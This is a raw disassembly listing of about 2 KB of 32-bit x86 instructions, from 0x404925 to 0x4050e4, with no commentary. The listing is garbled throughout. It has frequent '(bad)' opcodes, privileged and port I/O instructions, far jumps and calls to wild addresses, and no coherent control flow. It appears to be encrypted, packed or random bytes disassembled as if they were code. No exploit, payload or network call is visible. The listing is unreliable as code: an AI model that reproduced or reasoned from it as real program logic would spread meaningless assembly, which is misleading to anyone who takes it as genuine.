  404925:	int3   
  404926:	cld    
  404927:	aas    
  404928:	fdiv   st(1),st
  40492a:	push   edx
  40492b:	cmc    
  40492c:	ret    
  40492d:	jecxz  0x404981
  40492f:	cwde   
  404930:	(bad)  
  404932:	or     eax,DWORD PTR [edx]
  404934:	mov    cl,0x4a
  404936:	jo     0x4048e2
  404938:	loopne 0x4048f3
  40493a:	stc    
  40493b:	gs loop 0x4048f8
  40493e:	push   ecx
  40493f:	cwde   
  404940:	pop    esp
  404941:	xor    bh,BYTE PTR [eax+edi*8+0xcaea380]
  404948:	lds    eax,FWORD PTR [esi+ebx*2-0x64]
  40494c:	sub    DWORD PTR [ecx+0x25],edx
  40494f:	mov    cs,WORD PTR [edx-0x88623ae]
  404955:	(bad)  
  404956:	pop    esp
  404957:	out    dx,eax
  404958:	inc    ebx
  404959:	push   es
  40495a:	pop    edi
  40495b:	mov    ds:0xdec0773e,eax
  404960:	pop    ecx
  404961:	ins    DWORD PTR es:[edi],dx
  404962:	sar    BYTE PTR [edx],1
  404964:	idiv   DWORD PTR [edi-0x5]
  404967:	adc    ebp,DWORD PTR [edi+esi*4-0x16686cfb]
  40496e:	push   esp
  40496f:	pop    ss
  404970:	push   ebx
  404971:	test   eax,0x3922c21
  404976:	in     al,0x35
  404978:	lods   al,BYTE PTR cs:[esi]
  40497a:	sbb    DWORD PTR [ebx],esi
  40497c:	cli    
  40497d:	jp     0x40493c
  40497f:	out    0xbd,eax
  404981:	jb     0x4049e7
  404983:	jg     0x40494a
  404985:	cmp    ch,BYTE PTR [ebp-0x80]
  404988:	mov    ds:0x16bb1b77,al
  40498d:	adc    DWORD PTR [esi],ebp
  40498f:	in     eax,dx
  404990:	(bad)  
  404991:	sbb    esi,ecx
  404993:	and    BYTE PTR [esi+0x26],bh
  404996:	jo     0x404942
  404998:	xchg   esp,eax
  404999:	fwait
  40499a:	or     edi,DWORD PTR [edi+0x7d69e72d]
  4049a0:	jmp    0x8cfeebb4
  4049a5:	mov    DWORD PTR [edi-0x211eb6dd],edi
  4049ab:	add    dl,al
  4049ad:	test   DWORD PTR [ebx+0x23],esp
  4049b0:	imul   esi,DWORD PTR [esi+edx*2+0x2b1833d1],0x40
  4049b8:	mov    eax,ds:0x7121f98d
  4049bd:	dec    ecx
  4049be:	sub    bl,BYTE PTR [esi+0x720e1764]
  4049c4:	adc    BYTE PTR [eax+0x50],bh
  4049c7:	not    DWORD PTR [edx-0x30f877c2]
  4049cd:	dec    edi
  4049ce:	push   ebx
  4049cf:	sbb    al,0x6f
  4049d1:	gs mov ecx,0x6626c645
  4049d7:	inc    ebp
  4049d8:	sub    DWORD PTR [edx-0x1c02e92d],esp
  4049de:	hlt    
  4049df:	fnstcw WORD PTR [ecx-0x2f2587e]
  4049e5:	or     al,0x57
  4049e7:	mov    dh,BYTE PTR [eax]
  4049e9:	push   ebx
  4049ea:	and    bl,BYTE PTR [esi+0x204c1ceb]
  4049f0:	dec    eax
  4049f1:	das    
  4049f2:	pop    eax
  4049f3:	dec    ecx
  4049f4:	loopne 0x40497e
  4049f6:	call   0xc7a48a9
  4049fb:	cli    
  4049fc:	test   BYTE PTR [eax+0x5666011c],bh
  404a02:	lock into 
  404a04:	sub    esp,DWORD PTR [edx+ebp*2]
  404a07:	shr    cl,1
  404a09:	and    BYTE PTR [esi+0x20ad0531],dl
  404a0f:	loopne 0x404a1b
  404a11:	into   
  404a12:	jns    0x404a92
  404a14:	inc    ecx
  404a15:	shr    BYTE PTR [ebx],1
  404a17:	sti    
  404a18:	icebp  
  404a19:	cmp    al,0x42
  404a1b:	lock or al,0x27
  404a1e:	jns    0x404a58
  404a20:	xchg   cl,dl
  404a22:	(bad)  
  404a23:	mov    ebp,0x41ef766e
  404a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a29:	lods   al,BYTE PTR ds:[esi]
  404a2a:	push   es
  404a2b:	lds    ebp,FWORD PTR [ebx-0x51]
  404a2e:	sub    esi,DWORD PTR [edi]
  404a30:	push   eax
  404a31:	dec    esp
  404a32:	push   ebx
  404a33:	ret    0x15ab
  404a36:	inc    eax
  404a37:	call   0x5fb4:0xb749c990
  404a3e:	mov    bh,0x5e
  404a40:	(bad)  
  404a41:	cli    
  404a42:	dec    esi
  404a43:	ret    
  404a44:	pop    ebp
  404a45:	and    cl,BYTE PTR [edi-0x1b]
  404a48:	cmp    eax,0x1ad2687d
  404a4d:	(bad)  
  404a4e:	dec    eax
  404a4f:	std    
  404a50:	sbb    edi,ebp
  404a52:	jmp    0x404aaf
  404a54:	push   ecx
  404a55:	lea    ebx,[esp+ecx*2-0x3b786caf]
  404a5c:	mov    al,0x4b
  404a5e:	lahf   
  404a5f:	ret    
  404a60:	daa    
  404a61:	cld    
  404a62:	mov    bh,0x52
  404a64:	pop    eax
  404a65:	sar    DWORD PTR [esi+0x3e],0x28
  404a69:	inc    esi
  404a6a:	and    eax,0x18c286e6
  404a6f:	sbb    BYTE PTR [esi-0x6f871df9],ah
  404a75:	into   
  404a76:	xor    DWORD PTR [ebx-0x4b3f2e9f],esi
  404a7c:	lods   eax,DWORD PTR ds:[esi]
  404a7d:	cmp    eax,0xf309c31d
  404a82:	(bad)  
  404a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a84:	aas    
  404a85:	daa    
  404a86:	jae    0x404a6c
  404a88:	mov    dh,0xdc
  404a8a:	xor    cl,BYTE PTR [edi]
  404a8c:	rol    dl,cl
  404a8e:	and    eax,0x5c83bebe
  404a93:	inc    edi
  404a94:	inc    eax
  404a95:	(bad)  
  404a97:	test   DWORD PTR [ebp-0x69b8eb34],edi
  404a9d:	add    BYTE PTR [edi+0x10],dl
  404aa0:	dec    ebp
  404aa1:	mov    edx,0x14d0d723
  404aa6:	adc    al,0x9a
  404aa8:	lods   al,BYTE PTR ds:[esi]
  404aa9:	xchg   edi,eax
  404aaa:	in     eax,0xe1
  404aac:	loop   0x404a3d
  404aae:	cmp    DWORD PTR [ebp+0x77a3f96c],ebx
  404ab4:	sbb    bh,dl
  404ab6:	int    0xb8
  404ab8:	cmp    edi,DWORD PTR [eax]
  404aba:	sbb    ch,BYTE PTR [edi]
  404abc:	or     ecx,DWORD PTR [ecx]
  404abe:	stc    
  404abf:	sbb    edx,edi
  404ac1:	jo     0x404b34
  404ac3:	outs   dx,DWORD PTR ds:[esi]
  404ac4:	cmc    
  404ac5:	sub    BYTE PTR [ebx-0x39],cl
  404ac8:	shl    BYTE PTR [ecx-0x72],0x54
  404acc:	sub    eax,0x336e9fc8
  404ad1:	mov    eax,0x8b4862b1
  404ad6:	or     esp,edx
  404ad8:	mov    cl,BYTE PTR [eax]
  404ada:	inc    esi
  404adb:	les    edi,FWORD PTR [edi+0x59d161cd]
  404ae1:	sahf   
  404ae2:	mov    ecx,DWORD PTR [ebp+0x6696e286]
  404ae8:	push   edi
  404ae9:	test   BYTE PTR [edx+0x3d67b893],ch
  404aef:	sub    DWORD PTR [eax-0x3ea1f986],ebx
  404af5:	les    ax,DWORD PTR [eax]
  404af8:	lods   eax,DWORD PTR ds:[esi]
  404af9:	or     ch,BYTE PTR [edx]
  404afb:	sahf   
  404afc:	pop    esp
  404afd:	out    0x36,eax
  404aff:	rol    BYTE PTR [edi-0x4d],cl
  404b02:	xor    al,0xe0
  404b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b05:	scas   al,BYTE PTR es:[edi]
  404b06:	imul   eax,DWORD PTR [ecx-0x1c],0x981fcf3e
  404b0d:	inc    ecx
  404b0e:	out    dx,al
  404b0f:	mov    ch,0x32
  404b11:	add    DWORD PTR [edx+ebx*4+0x4daf0c24],edi
  404b18:	inc    edx
  404b19:	cmp    eax,0xa6f48399
  404b1e:	ret    
  404b1f:	push   cs
  404b20:	pop    ebx
  404b21:	push   es
  404b22:	mov    ch,0xa3
  404b25:	cmp    DWORD PTR [edi],ebx
  404b27:	pop    ebx
  404b28:	ret    
  404b29:	xchg   ecx,eax
  404b2a:	inc    esp
  404b2b:	(bad)  
  404b2c:	sub    eax,0xb20a6c6d
  404b31:	mov    BYTE PTR [ebp+0x2d5b4110],ch
  404b37:	stos   BYTE PTR es:[edi],al
  404b38:	cmp    dh,BYTE PTR [ebx+eiz*1]
  404b3b:	out    dx,eax
  404b3c:	sahf   
  404b3d:	retf   
  404b3e:	or     DWORD PTR [edi+0x37],0x21
  404b42:	pop    ss
  404b43:	push   0xffffffd7
  404b45:	add    eax,0x499a8c3c
  404b4a:	aad    0xb6
  404b4c:	add    edx,DWORD PTR [ebp-0xa]
  404b4f:	add    al,0x79
  404b51:	sbb    BYTE PTR [ecx],cl
  404b53:	cmp    edi,DWORD PTR [ecx]
  404b55:	stos   DWORD PTR es:[edi],eax
  404b56:	pop    ecx
  404b57:	bound  eax,QWORD PTR [esi+0x62]
  404b5a:	rcr    DWORD PTR ds:0x9f4700c1,cl
  404b60:	bound  eax,QWORD PTR [edx-0x26c45fc4]
  404b66:	in     eax,dx
  404b67:	out    dx,eax
  404b68:	dec    edx
  404b69:	xchg   DWORD PTR [eax+ebp*8-0x604c268],esi
  404b70:	sub    al,0x95
  404b72:	js     0x404bc0
  404b74:	cmc    
  404b75:	imul   edx,DWORD PTR [esp+edx*4-0x32d950],0xf4e48808
  404b80:	rcr    BYTE PTR [esi-0x5c],0x1e
  404b84:	js     0x404b0c
  404b86:	push   es
  404b87:	js     0x404bc6
  404b89:	xchg   ebx,eax
  404b8a:	mov    ebp,0x157daba7
  404b8f:	add    BYTE PTR [eax],bl
  404b91:	add    al,0xfa
  404b93:	ror    DWORD PTR [ebx+0x5dea30f0],1
  404b99:	push   cs
  404b9a:	inc    edx
  404b9b:	rcr    BYTE PTR [ebx-0x4e5b35b9],0x4d
  404ba2:	idiv   BYTE PTR [ebx+0x31]
  404ba5:	xor    edx,0x5e8b8a31
  404bab:	add    bh,BYTE PTR [ebx+0x202242d7]
  404bb1:	jmp    FWORD PTR [ebx+0x77]
  404bb4:	jmp    0x3c48:0x2a1ce92
  404bbb:	jge    0x404bb0
  404bbd:	fisttp DWORD PTR [eax+0x7e]
  404bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bc1:	repnz jmp FWORD PTR [ecx-0x7f5312b3]
  404bc8:	jbe    0x404b51
  404bca:	and    DWORD PTR [edi-0x4eb3dd8e],0x3
  404bd1:	into   
  404bd2:	inc    edi
  404bd3:	inc    ebp
  404bd4:	xor    ebp,edx
  404bd6:	mov    esi,0xb00231b8
  404bdb:	ret    0x914b
  404bde:	imul   esp,DWORD PTR [esi],0xa6db6481
  404be4:	mov    edi,0x763f44e
  404be9:	jne    0x404bd3
  404beb:	popf   
  404bec:	arpl   ax,bx
  404bee:	jns    0x404c33
  404bf0:	and    edi,DWORD PTR [edx]
  404bf2:	call   0xf31e0ac1
  404bf7:	inc    edi
  404bf8:	(bad)  
  404bf9:	xor    esi,DWORD PTR [ebx+0x1b4041a8]
  404bff:	jnp    0x404c52
  404c01:	jmp    0xf675:0xfe207eb
  404c08:	fwait
  404c09:	push   ebx
  404c0a:	call   0x5c02bab2
  404c0f:	jae    0x404b99
  404c11:	into   
  404c12:	push   ss
  404c13:	mov    ch,0x7f
  404c15:	jl     0x404c89
  404c17:	xchg   ebp,ebp
  404c19:	or     ch,dh
  404c1b:	retf   
  404c1c:	cli    
  404c1d:	sbb    bl,al
  404c1f:	lock dec ebx
  404c21:	pop    ebx
  404c22:	test   DWORD PTR ds:0x32b5a13d,edx
  404c28:	int3   
  404c29:	sub    cl,0xfc
  404c2c:	jmp    0x7b34:0xfea92bae
  404c33:	mov    ecx,0xbdd06ba5
  404c38:	xchg   ebx,eax
  404c39:	jnp    0x404bbe
  404c3b:	inc    edi
  404c3c:	retf   0x41da
  404c3f:	je     0x404c29
  404c41:	push   ebp
  404c42:	mov    cl,0xf0
  404c44:	push   ss
  404c45:	das    
  404c46:	push   eax
  404c47:	mov    ecx,0x7ec553d6
  404c4c:	aad    0x49
  404c4e:	stc    
  404c4f:	jbe    0x404bf3
  404c51:	sbb    al,0x69
  404c53:	jno    0x404c53
  404c55:	xlat   BYTE PTR ds:[ebx]
  404c56:	(bad)  
  404c57:	out    dx,eax
  404c58:	or     DWORD PTR [esi+ecx*8+0x747a1bac],0xffffffb6
  404c60:	add    ecx,DWORD PTR [ecx-0x7a9646bb]
  404c66:	mov    bh,BYTE PTR [esi]
  404c68:	aam    0xf5
  404c6a:	call   0x3b72e4f4
  404c6f:	or     BYTE PTR [esp+edi*1+0x32acaa94],0xaf
  404c77:	shl    BYTE PTR [ebx+0x13069a10],cl
  404c7d:	pop    esp
  404c7e:	lock mul edi
  404c81:	(bad)  
  404c82:	pushf  
  404c83:	es push ebp
  404c85:	cmp    eax,0xc16131aa
  404c8a:	inc    eax
  404c8b:	pop    ebx
  404c8c:	sub    al,0x31
  404c8e:	shl    DWORD PTR [ebx],cl
  404c90:	dec    ebx
  404c91:	cld    
  404c92:	pop    ds
  404c93:	mov    dh,0x8c
  404c95:	(bad)  
  404c96:	cmp    dl,BYTE PTR [eax]
  404c98:	mov    edx,0x325fcd83
  404c9d:	fnsave [edi+0x4e19b982]
  404ca3:	mov    edx,0x4fdb8ee0
  404ca8:	repz adc DWORD PTR [edi+ebp*4-0x50],ecx
  404cad:	mov    ds:0x7f9bee79,eax
  404cb2:	lock inc ebx
  404cb4:	mov    dl,0x79
  404cb6:	and    dl,ch
  404cb8:	jo     0x404ce0
  404cba:	mul    DWORD PTR [esi+esi*8]
  404cbd:	lock les edi,FWORD PTR [ebx]
  404cc0:	push   0x73
  404cc2:	jecxz  0x404c4c
  404cc4:	mov    ch,0x10
  404cc6:	jns    0x404c78
  404cc8:	aaa    
  404cc9:	dec    esi
  404cca:	(bad)  
  404ccb:	repz pushf 
  404ccd:	outs   dx,DWORD PTR ds:[esi]
  404cce:	push   ds
  404ccf:	imul   eax,DWORD PTR [edi],0xfffffff8
  404cd2:	cmc    
  404cd3:	mov    dl,0x11
  404cd5:	xor    BYTE PTR [ebx-0x7e],dl
  404cd8:	jle    0x404d03
  404cda:	and    DWORD PTR [ebx-0xd6cfaff],ebp
  404ce0:	fcom   QWORD PTR [ebx-0x6e]
  404ce3:	jle    0x404c91
  404ce5:	aas    
  404ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce7:	fucomi st,st(6)
  404ce9:	cmp    dh,BYTE PTR [ecx+0x12]
  404cec:	and    al,0xc7
  404cee:	retf   0x70cf
  404cf1:	(bad)  
  404cf2:	push   cs
  404cf3:	xchg   ebp,eax
  404cf4:	jecxz  0x404cab
  404cf6:	inc    edi
  404cf7:	xor    eax,0x61d73e7b
  404cfc:	mov    ds:0xdb840207,al
  404d01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d02:	adc    al,0x19
  404d04:	int3   
  404d05:	mov    dl,0x6c
  404d07:	int    0xe5
  404d09:	les    ecx,FWORD PTR [ebx]
  404d0b:	pusha  
  404d0c:	mov    bh,0xb1
  404d0e:	mov    dl,0x67
  404d10:	push   ebp
  404d11:	or     eax,0x2c8508c5
  404d16:	cmp    esi,DWORD PTR [eax]
  404d18:	inc    ecx
  404d19:	scas   al,BYTE PTR es:[edi]
  404d1a:	xchg   edx,eax
  404d1b:	test   DWORD PTR [ecx-0x56],esi
  404d1e:	pop    edi
  404d1f:	int    0xa8
  404d21:	les    ebp,FWORD PTR [ebx]
  404d23:	jp     0x404cde
  404d25:	sub    dl,dh
  404d27:	fmul   QWORD PTR [ebx+0x65]
  404d2a:	data16 cmp al,0xae
  404d2d:	sub    eax,0xa3961634
  404d32:	xlat   BYTE PTR ds:[ebx]
  404d33:	adc    DWORD PTR [esi],esi
  404d35:	js     0x404d1e
  404d37:	mov    ch,0xaf
  404d39:	test   al,0xb6
  404d3b:	sbb    edi,DWORD PTR [eax-0x1ebe803]
  404d41:	je     0x404dc1
  404d43:	add    esp,ebx
  404d45:	retf   
  404d46:	xchg   esi,eax
  404d47:	and    al,0x31
  404d49:	js     0x404d0c
  404d4b:	cdq    
  404d4c:	mov    ds:0x71f586e3,al
  404d51:	add    esi,ecx
  404d53:	cld    
  404d54:	inc    ebx
  404d55:	out    dx,al
  404d56:	sbb    DWORD PTR [esi-0x43],0x1422f1ec
  404d5d:	xchg   ebx,eax
  404d5e:	mov    DWORD PTR [edi],eax
  404d60:	mov    DWORD PTR [ebx-0xb],ebx
  404d63:	push   esp
  404d64:	leave  
  404d65:	gs mov edx,0x420c60e3
  404d6b:	mov    dh,0x14
  404d6d:	int3   
  404d6e:	ds pop ebx
  404d70:	enter  0x12b7,0xfb
  404d74:	jmp    0x404d7c
  404d76:	adc    eax,0x9f7ab8ea
  404d7b:	dec    esi
  404d7c:	leave  
  404d7d:	push   ss
  404d7e:	jae    0x404d24
  404d80:	cmp    eax,0xcba8673c
  404d85:	jnp    0x404dfa
  404d87:	test   DWORD PTR [esi+0x1d23a2e7],0xb8cb12c2
  404d91:	test   eax,0xa6e21192
  404d96:	shl    ch,0x6f
  404d99:	popf   
  404d9a:	dec    esi
  404d9b:	sub    edi,edi
  404d9d:	mov    ah,0x8c
  404d9f:	mov    WORD PTR [esi+ebx*1],?
  404da2:	cdq    
  404da3:	push   ebx
  404da4:	or     al,ah
  404da6:	push   cs
  404da7:	sbb    al,0x0
  404da9:	mov    eax,esi
  404dab:	push   ds
  404dac:	fiadd  WORD PTR ds:0x9443f1ee
  404db2:	int3   
  404db3:	mov    al,0xc8
  404db5:	xchg   ecx,eax
  404db6:	cmp    eax,0x10a283d8
  404dbb:	xchg   ebx,eax
  404dbc:	int3   
  404dbd:	adc    al,0x1e
  404dbf:	je     0x404dc5
  404dc1:	shl    DWORD PTR [ecx+0x709d54aa],0xd2
  404dc8:	popa   
  404dc9:	lea    edi,[esi+edx*8-0x58]
  404dcd:	inc    esp
  404dce:	(bad)  [ecx+ebp*4]
  404dd1:	xchg   ebx,eax
  404dd2:	outs   dx,BYTE PTR ds:[esi]
  404dd3:	pusha  
  404dd4:	push   edi
  404dd5:	fsub   QWORD PTR [ebx]
  404dd7:	push   0xc129bf03
  404ddc:	push   eax
  404ddd:	cs ja  0x404dc6
  404de0:	jl     0x404e43
  404de2:	fdivr  DWORD PTR ds:0x4d006e72
  404de8:	sbb    bh,bl
  404dea:	iret   
  404deb:	cmp    al,0x38
  404ded:	retf   
  404dee:	pop    esp
  404def:	inc    ecx
  404df0:	or     al,0xbd
  404df2:	push   ebx
  404df3:	mov    al,ds:0x9ec7e8ca
  404df8:	xchg   esi,eax
  404df9:	call   0x1db2:0x3a187520
  404e00:	scas   al,BYTE PTR es:[edi]
  404e01:	rcr    DWORD PTR [esi+esi*8+0x5f0c336a],cl
  404e08:	mov    al,BYTE PTR [ebx]
  404e0a:	push   edi
  404e0b:	mov    dl,0x34
  404e0d:	mov    ds,WORD PTR [ecx-0x15]
  404e10:	xchg   ecx,eax
  404e11:	sahf   
  404e12:	xchg   esp,eax
  404e13:	icebp  
  404e14:	jae    0x404ddd
  404e16:	lods   al,BYTE PTR ds:[esi]
  404e17:	xchg   ebx,eax
  404e18:	dec    ebp
  404e19:	adc    BYTE PTR [eax-0x6e761e76],ah
  404e1f:	xchg   edi,eax
  404e20:	int    0xe3
  404e22:	inc    esp
  404e23:	jmp    0xdd52ad33
  404e28:	inc    esi
  404e29:	or     ecx,DWORD PTR [eax]
  404e2b:	mov    ds:0xacfe4ad4,al
  404e30:	sbb    BYTE PTR [edx-0x3e73273b],ah
  404e36:	pop    ecx
  404e37:	xchg   esi,eax
  404e38:	and    al,0x6f
  404e3a:	xchg   edx,eax
  404e3b:	call   0x717c:0x24746901
  404e42:	das    
  404e43:	xor    al,0x57
  404e45:	jbe    0x404ddd
  404e47:	aad    0x9e
  404e49:	sub    DWORD PTR [ecx],esp
  404e4b:	(bad)  
  404e4c:	out    dx,al
  404e4d:	ret    
  404e4e:	mov    bl,0x31
  404e50:	add    dl,bl
  404e52:	and    esp,ebx
  404e54:	out    dx,al
  404e55:	jne    0x404e4f
  404e57:	in     eax,0xa8
  404e59:	rol    BYTE PTR [ebx],cl
  404e5b:	pop    ss
  404e5c:	neg    eax
  404e5e:	fmul   st,st(2)
  404e60:	out    0x79,al
  404e62:	gs sub al,0xa2
  404e65:	loop   0x404dff
  404e67:	jne    0x404ea7
  404e69:	jno    0x404e69
  404e6b:	fdivr  QWORD PTR [edi-0x41]
  404e6e:	cmp    eax,0xc47d3ab
  404e73:	loop   0x404e35
  404e75:	jo     0x404e61
  404e77:	dec    edi
  404e78:	or     DWORD PTR [ebp+0x78],edx
  404e7b:	test   al,0xf5
  404e7d:	ins    DWORD PTR es:[edi],dx
  404e7e:	ror    BYTE PTR [ecx-0xf],1
  404e81:	hlt    
  404e82:	add    bl,BYTE PTR ds:0x66ab5149
  404e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e89:	lds    edi,FWORD PTR fs:[eax+0x1a]
  404e8d:	adc    DWORD PTR [ebp+0xd],edx
  404e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e91:	ret    0x715f
  404e94:	jno    0x404e7a
  404e96:	sbb    BYTE PTR [eax+eiz*8],ch
  404e99:	sbb    eax,ebp
  404e9b:	mov    bl,0x49
  404e9d:	rol    BYTE PTR [edx],0x1d
  404ea0:	push   eax
  404ea1:	xchg   edi,eax
  404ea2:	xchg   edi,eax
  404ea3:	xchg   esi,eax
  404ea4:	fstp   TBYTE PTR [ebp-0x5]
  404ea7:	cmp    BYTE PTR [eax],al
  404ea9:	adc    BYTE PTR [edi-0x79e661c4],dh
  404eaf:	enter  0x450d,0x9e
  404eb3:	loope  0x404f06
  404eb5:	les    ebx,FWORD PTR [ebx+0x5f1f17ec]
  404ebb:	inc    esp
  404ebc:	push   ss
  404ebd:	sub    DWORD PTR [edx-0x6219f319],edi
  404ec3:	scas   al,BYTE PTR es:[edi]
  404ec4:	(bad)  
  404ec5:	xchg   edi,eax
  404ec6:	(bad)  
  404ec7:	lock mov cl,0x3c
  404eca:	retf   
  404ecb:	xor    al,0x71
  404ecd:	imul   ebp,ebx,0x70
  404ed0:	ja     0x404ede
  404ed2:	cmp    al,0x2e
  404ed4:	test   eax,0x40bf55d8
  404ed9:	scas   al,BYTE PTR es:[edi]
  404eda:	call   0x963782d2
  404edf:	enter  0x375a,0x32
  404ee3:	ds pop ds
  404ee5:	rol    BYTE PTR [esi+0x5bdb3eab],cl
  404eeb:	jns    0x404ef9
  404eed:	or     dh,0x77
  404ef0:	(bad)  
  404ef1:	and    BYTE PTR [esi+edi*4],bl
  404ef4:	in     al,dx
  404ef5:	js     0x404f08
  404ef7:	jecxz  0x404f1f
  404ef9:	mov    ds:0xc7e5c36b,eax
  404efe:	jne    0x404f1e
  404f00:	xor    dh,dh
  404f02:	call   0x927c4c59
  404f07:	mov    al,ds:0xf391a85d
  404f0c:	or     ch,BYTE PTR [ebx]
  404f0e:	adc    al,0x99
  404f10:	adc    DWORD PTR [eax],esi
  404f12:	das    
  404f13:	pop    es
  404f14:	pop    es
  404f15:	shr    DWORD PTR [edi+0x1dc450c0],0xaf
  404f1c:	stos   DWORD PTR es:[edi],eax
  404f1d:	dec    edx
  404f1e:	repnz add BYTE PTR [edi+0x9a9742f],dl
  404f25:	jle    0x404f52
  404f27:	dec    esi
  404f28:	stos   DWORD PTR es:[edi],eax
  404f29:	cmp    DWORD PTR [esp+edi*2-0x4c],eax
  404f2d:	outs   dx,DWORD PTR ds:[esi]
  404f2e:	adc    bh,dh
  404f30:	cli    
  404f31:	sbb    eax,DWORD PTR es:[ebp+0x56e9cab1]
  404f38:	cmp    BYTE PTR [ecx+eax*2+0x6a],dl
  404f3c:	test   ah,al
  404f3e:	add    eax,0x2a1b6727
  404f43:	adc    dh,BYTE PTR [ebx]
  404f45:	or     DWORD PTR [ebx+0x59044675],esi
  404f4b:	inc    BYTE PTR es:0x7058ebb8
  404f52:	fstp   DWORD PTR [ebp+0x9]
  404f55:	jo     0x404edb
  404f57:	push   ss
  404f58:	sub    DWORD PTR [ebx+eiz*8-0x468e5ccb],edx
  404f5f:	jmp    esi
  404f61:	cdq    
  404f62:	ds or  eax,0x7d3dd78c
  404f68:	add    ah,BYTE PTR [ecx+0x386075f8]
  404f6e:	data16 jle 0x404fd7
  404f71:	xchg   esi,eax
  404f72:	das    
  404f73:	iret   
  404f74:	xlat   BYTE PTR ds:[ebx]
  404f75:	push   edi
  404f76:	in     al,dx
  404f77:	push   ds
  404f78:	xchg   esp,eax
  404f79:	cdq    
  404f7a:	rcl    DWORD PTR [esi+0x59],0x3
  404f7e:	push   eax
  404f7f:	mov    esp,0x508d8505
  404f84:	in     eax,dx
  404f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f86:	dec    ebp
  404f87:	cmp    eax,0x96ddcde3
  404f8c:	aas    
  404f8d:	fwait
  404f8e:	add    DWORD PTR [edi-0x42803dec],0xffffff95
  404f95:	arpl   WORD PTR [edi+edx*4+0x1],cx
  404f99:	inc    ebx
  404f9a:	and    bl,BYTE PTR [eax-0x171d602f]
  404fa0:	adc    BYTE PTR [ecx-0x121c4198],ah
  404fa6:	add    al,0x38
  404fa8:	add    eax,0xcf17104e
  404fad:	cld    
  404fae:	(bad)  
  404faf:	aaa    
  404fb0:	fbld   TBYTE PTR [edi-0x7678d50a]
  404fb6:	cmpxchg BYTE PTR [eax],ch
  404fb9:	and    ah,BYTE PTR [eax-0x5f8095cf]
  404fbf:	cmp    BYTE PTR [eax+edi*4],al
  404fc2:	mov    eax,0x6cebab4c
  404fc7:	adc    al,BYTE PTR [ecx]
  404fc9:	in     eax,dx
  404fca:	mov    BYTE PTR [esi-0x73],bl
  404fcd:	or     esi,DWORD PTR [edx+0x1770278]
  404fd3:	jb     0x40504b
  404fd5:	ficom  WORD PTR [esi-0x7ee41343]
  404fdb:	int3   
  404fdc:	lods   eax,DWORD PTR ds:[esi]
  404fdd:	or     BYTE PTR [esi],ah
  404fdf:	xor    ch,BYTE PTR [ebx-0x77e75f1e]
  404fe5:	adc    cl,BYTE PTR [edi+0x41]
  404fe8:	daa    
  404fe9:	cwde   
  404fea:	int3   
  404feb:	push   edi
  404fec:	lods   al,BYTE PTR ds:[esi]
  404fed:	cli    
  404fee:	ss fsubr st,st(2)
  404ff1:	jbe    0x404f8d
  404ff3:	sub    bl,al
  404ff5:	mov    edi,0x3bd3d728
  404ffa:	jecxz  0x404ffe
  404ffc:	mov    al,ds:0xd4ea61c1
  405001:	out    0x6c,eax
  405003:	xor    al,0x6e
  405005:	xchg   ebp,eax
  405006:	and    esp,edx
  405008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405009:	les    eax,FWORD PTR [ebp+0x28a0383c]
  40500f:	add    DWORD PTR [edi-0x533120a1],edi
  405015:	aas    
  405016:	jp     0x405059
  405018:	mov    ebx,0x40e6f5ed
  40501d:	xchg   ebp,eax
  40501e:	mov    al,ds:0x35c0b320
  405023:	jl     0x404fe8
  405025:	lods   al,BYTE PTR ds:[esi]
  405026:	jno    0x405018
  405028:	fnstsw WORD PTR [esi+0x37025849]
  40502e:	sub    eax,0x7719a245
  405033:	cli    
  405034:	cmp    DWORD PTR [ecx+eax*2-0x4f3f4e6d],0xffe85c2a
  40503f:	cmp    ecx,DWORD PTR [edx]
  405041:	and    BYTE PTR [esi],al
  405043:	pop    esi
  405044:	xlat   BYTE PTR ds:[ebx]
  405045:	fcom   DWORD PTR [edx+0x4a]
  405048:	jbe    0x405003
  40504a:	jmp    0xa8fd7735
  40504f:	nop
  405050:	clc    
  405051:	jae    0x40508c
  405053:	das    
  405054:	mov    al,bl
  405056:	and    DWORD PTR [edx],ecx
  405058:	pusha  
  405059:	push   cs
  40505a:	pop    es
  40505b:	pop    es
  40505c:	xchg   esi,eax
  40505d:	lods   eax,DWORD PTR ds:[esi]
  40505e:	cld    
  40505f:	jbe    0x405002
  405061:	or     BYTE PTR ds:0x837d78c7,bh
  405067:	leave  
  405068:	push   es
  405069:	mov    ebp,0xf4c2f8f6
  40506e:	pop    ebx
  40506f:	mov    ecx,0x6da33c
  405074:	mov    al,0xa
  405076:	pop    ds
  405077:	xchg   esi,eax
  405078:	and    eax,0x96665bdc
  40507d:	bound  ebp,QWORD PTR [edi+0x13]
  405080:	cmc    
  405081:	xor    DWORD PTR [ecx+0x2e58d1eb],edx
  405087:	inc    edi
  405088:	push   ecx
  405089:	(bad)  
  40508a:	mov    edx,DWORD PTR [edx-0x62b30f71]
  405090:	(bad)  
  405091:	jno    0x405054
  405093:	dec    ecx
  405094:	enter  0xaca4,0x51
  405098:	mov    ebx,0xfc4dd61f
  40509d:	vmread DWORD PTR [ecx+0x9c93982],edx
  4050a4:	mov    DWORD PTR [edi+0x2b2fa5aa],ebp
  4050aa:	pushf  
  4050ab:	xchg   esi,eax
  4050ac:	mov    bh,0x56
  4050ae:	inc    edx
  4050af:	mov    edi,0x40f12b75
  4050b4:	inc    ebp
  4050b5:	int3   
  4050b6:	imul   ecx,ebx,0xd
  4050b9:	loope  0x4050f3
  4050bb:	enter  0x5e28,0x1
  4050bf:	fwait
  4050c0:	mov    esi,0xa5f44667
  4050c5:	mov    dl,0xaa
  4050c7:	pop    ds
  4050c8:	sub    bh,0xe9
  4050cb:	repnz lods al,BYTE PTR ds:[esi]
  4050cd:	test   al,0x9d
  4050cf:	adc    bh,cl
  4050d1:	sahf   
  4050d2:	ja     0x405119
  4050d4:	jge    0x4050ee
  4050d6:	call   0x1d82170f
  4050db:	or     dl,ch
  4050dd:	or     bl,BYTE PTR [edi]
  4050df:	sub    eax,0xb421a5a0
  4050e4:	mov    cl,0x77
